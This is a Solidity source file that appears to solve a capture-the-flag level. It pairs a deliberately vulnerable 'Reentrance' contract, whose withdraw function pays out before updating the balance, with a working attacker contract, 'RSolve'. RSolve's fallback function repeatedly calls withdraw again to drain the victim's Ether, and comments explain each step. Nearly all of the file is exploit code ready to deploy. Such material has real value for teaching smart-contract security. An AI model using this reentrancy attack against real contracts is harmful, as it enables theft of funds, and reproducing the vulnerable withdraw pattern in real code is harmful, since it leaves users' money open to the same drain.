pragma solidity ^0.4.18;

contract Reentrance {
    mapping(address => uint) public balances;
    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }
    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }
    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            if(msg.sender.call.value(_amount)()) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
    function() public payable {}
}
contract RSolve {
    Reentrance victim;
    uint public count;
    function RSolve(address ct) public payable {// Store our Reentrance instance
        victim = Reentrance(ct);
    }
    function attack(uint v) public {
        // Donate some value X using our address as the _to parameter
        victim.donate.value(v)(this);
        // Withdraw some value X
        victim.withdraw(v);
    }
    function() public payable {
        // Receiver for funds withdrawn by the attack
        if (count < 30) {
            count++;
            // Reentrant withdraw calls
            victim.withdraw(msg.value);
        }
    }
}
